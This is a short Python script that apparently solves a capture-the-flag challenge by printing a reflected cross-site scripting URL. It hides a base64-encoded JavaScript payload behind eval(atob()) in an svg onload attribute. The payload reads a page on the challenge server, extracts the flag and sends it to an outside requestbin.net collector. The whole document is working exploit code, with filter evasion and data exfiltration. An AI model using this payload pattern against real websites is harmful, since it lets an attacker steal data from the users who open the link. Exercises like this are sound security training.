#!/usr/bin/env python2

from __future__ import print_function

import base64
import sys

payload = """
fetch('http://challenge.acictf.com:51204/article/1').then(function(resp) {
  return resp.text();
}).then(function(text) {
  flag = text.match(/ACI{.*}/g);
  window.location = 'http://requestbin.net/r/u36iixu3?f=' + flag;
});
"""

b64_payload = base64.b64encode(payload).replace('=', '%3D')
eval_payload = 'eval(atob(`' + b64_payload + '`))'
print(
    'http://challenge.acictf.com:51204/search?search=1&%3Csvg%0conload%3D"',
    eval_payload,
    '"%3Etest=%3Cscript%3E',
    sep=''
)